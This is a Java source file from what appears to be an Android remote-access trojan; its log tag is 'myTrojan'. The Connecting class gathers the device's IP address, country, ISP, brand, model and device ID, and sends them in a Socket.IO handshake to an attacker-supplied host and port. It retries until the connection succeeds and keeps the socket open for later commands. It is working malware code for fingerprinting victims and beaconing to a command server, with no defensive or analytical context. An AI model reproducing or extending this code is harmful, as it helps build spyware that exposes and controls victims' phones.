package com.example.activmon;

import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class Connecting {
    private static final String TAG = "myTrojan";
    private static Socket sock = null;
    private static final IO.Options opts = new IO.Options();
    private static JSONObject info = null;
    private static boolean CONNECTED = false;
    static OkHttpClient client = new OkHttpClient();

    static Request request = new Request.Builder()
            .url("http://ip-api.com/json/")
            .build();

    public static void connect(String host,String port,String deviceID,long reTime) throws InterruptedException {
            Thread t1 = new Thread(() -> {
                while(info == null){
                    try {
                        Response response = client.newCall(request).execute();
                        if(response.isSuccessful()){
                            //making json object
                            info = new JSONObject();
                            assert response.body() != null;
                            JSONObject data = new JSONObject(response.body().string());
                            info.put("Country",data.getString("country"));
                            info.put("ISP",data.getString("isp"));
                            info.put("IP",data.getString("query"));
                            info.put("Brand", Build.BRAND);
                            info.put("Model", Build.MODEL);
                            info.put("Manufacture", Build.MANUFACTURER);
                            info.put("DeviceID", deviceID);
                            Log.d(TAG, "onResponse: "+info.toString());

                            // making connection
                            opts.query = "info="+info.toString();
                            sock = IO.socket("http://"+host+":"+port,opts);
                            sock.connect();
                            CONNECTED = true;
                            break;
                        }
                    } catch (IOException | JSONException | URISyntaxException e) {
                        e.printStackTrace();
                        CONNECTED = false;
                        Log.d(TAG, "run-1: "+e.getMessage());
                    }


                    // Sleeping
                    try {
                        Thread.sleep(reTime);
                        CONNECTED = false;
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                        Log.d(TAG, "run-2: "+e.getMessage());
                    }
                }
            });
        t1.start();
        t1.join();
    }
    public static Socket getSock(){
        return sock;
    }
    public static void connect(){
        sock.connect();
        CONNECTED = true;
        Log.d(TAG, "connected Again socket");
    }
    public static void disconnect(){
        sock.disconnect();
        CONNECTED = false;
        Log.d(TAG, "Disconnected socket");
    }
}
